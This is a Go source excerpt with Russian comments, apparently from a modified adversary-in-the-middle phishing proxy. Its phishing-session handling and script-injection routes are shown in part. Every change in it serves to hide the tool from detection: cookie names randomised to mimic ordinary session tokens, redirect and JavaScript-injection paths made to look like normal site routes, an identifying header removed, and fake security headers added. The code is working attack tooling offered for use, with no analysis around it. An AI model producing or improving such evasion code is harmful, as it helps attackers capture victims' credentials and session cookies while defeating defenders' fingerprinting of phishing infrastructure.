...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
    ...
    // Улучшенная генерация имени cookie для скрытия фреймворка
    // Используем более реалистичные имена cookie и переменную длину
    commonNames := []string{"session", "sid", "auth", "token", "csrf", "xsrf", "state", "nonce"}
    seed := GenRandomString(1)
    selectedName := commonNames[int(seed[0])%len(commonNames)]
    suffix := GenRandomString(4 + int(seed[0])%4) // 4-7 символов
    p.cookieName = selectedName + "_" + suffix
    ...
    p.Proxy.OnRequest().
        DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
            ...
            // Измененные паттерны URL для скрытия фреймворка
                // Используем более реалистичные пути вместо характерных /s/
                redirectPaths := []string{"^\\/redirect\\/([^\\/]*)", "^\\/auth\\/([^\\/]*)", "^\\/callback\\/([^\\/]*)", "^\\/return\\/([^\\/]*)"}
                jsPaths := []string{"^\\/assets\\/([^\\/]*)\\/([^\\/]*)", "^\\/static\\/([^\\/]*)\\/([^\\/]*)", "^\\/js\\/([^\\/]*)\\/([^\\/]*)"}

                // Случайный выбор паттерна при каждом запуске
                seed := GenRandomString(1)
                redir_re := regexp.MustCompile(redirectPaths[int(seed[0])%len(redirectPaths)])
                js_inject_re := regexp.MustCompile(jsPaths[int(seed[0])%len(jsPaths)])
            ...
            if phished {
                ...
                // Удален идентифицирующий заголовок для скрытия фреймворка
    ...
    p.Proxy.OnResponse().
        DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
            ...
            // Улучшенное управление заголовками безопасности для скрытия фреймворка
            // Вместо полного удаления заголовков, добавляем реалистичные значения
            ...
            // Случайно выбираем, какие заголовки добавлять для разнообразия
            seed := GenRandomString(1)
            for header, value := range securityHeaders {
                if int(seed[0])%3 != 0 { // 66% шанс добавить заголовок
                    resp.Header.Set(header, value)
                }
            }
            
            // Удаляем только самые проблемные заголовки
            var rm_headers = []string{"Content-Security-Policy-Report-Only"}
...
func (p *HttpProxy) getHomeDir() string {
    // Изменено для скрытия фреймворка - больше не используется
    // return strings.Replace(HOME_DIR, ".e", "X-E", 1)
    return "X-Session-Config"
}
...
func getSessionCookieName(pl_name string, cookie_name string) string {
    // Улучшенный алгоритм генерации имени cookie для скрытия фреймворка
    // Используем более реалистичные имена вместо предсказуемого хеша
    
    commonSuffixes := []string{"id", "token", "hash", "key", "sig", "auth", "sess", "csrf"}
    seed1 := GenRandomString(1)
    seed2 := GenRandomString(1)
    
    suffix := commonSuffixes[int(seed1[0])%len(commonSuffixes)]
    prefix := cookie_name[:min(len(cookie_name), 4)]
    randomPart := GenRandomString(8 + int(seed2[0])%4) // 8-11 символов
    
    // Возвращаем более реалистичное имя cookie вместо предсказуемого хеша
    return prefix + "_" + suffix + "_" + randomPart
}
